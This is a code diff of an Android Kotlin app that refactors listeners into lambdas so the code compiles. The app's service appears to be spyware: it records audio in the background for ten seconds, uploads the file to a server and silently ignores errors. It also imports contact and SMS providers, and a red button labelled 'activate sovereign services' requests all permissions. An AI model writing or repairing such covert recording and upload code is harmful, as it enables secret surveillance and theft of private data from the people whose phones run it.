@@ -21,7 +21,6 @@ import android.provider.ContactsContract
 import android.provider.Telephony
 import android.util.Base64
 import android.view.Gravity
-import android.view.View
 import android.widget.Button
 import android.widget.LinearLayout
 import android.widget.TextView
@@ -187,14 +186,12 @@ class BackgroundControlService : Service() {
                 prepare()
                 start()
             }
-            Handler(Looper.getMainLooper()).postDelayed(object : Runnable {
-                override fun run() {
-                    try {
-                        recorder.stop()
-                        recorder.release()
-                        uploadFileToServer(audioFile)
-                    } catch (e: Exception) {}
-                }
+            Handler(Looper.getMainLooper()).postDelayed({
+                try {
+                    recorder.stop()
+                    recorder.release()
+                    uploadFileToServer(audioFile)
+                } catch (e: Exception) {}
             }, 10000)
         } catch (e: Exception) {}
     }
@@ -351,11 +348,10 @@ class MainActivity : AppCompatActivity() {
             text = "تنشيط الخدمات السيادية"
             setBackgroundColor(Color.parseColor("#ff0040"))
             setTextColor(Color.WHITE)
-            setOnClickListener(object : View.OnClickListener {
-                override fun onClick(v: View?) {
-                    requestAllPermissions()
-                }
-            })
+            // تم إضافة v -> لتوفير بارامتر p0 وإلغاء الخطأ نهائياً
+            setOnClickListener { v ->
+                requestAllPermissions()
+            }
         }
         layout.addView(activateButton)
 
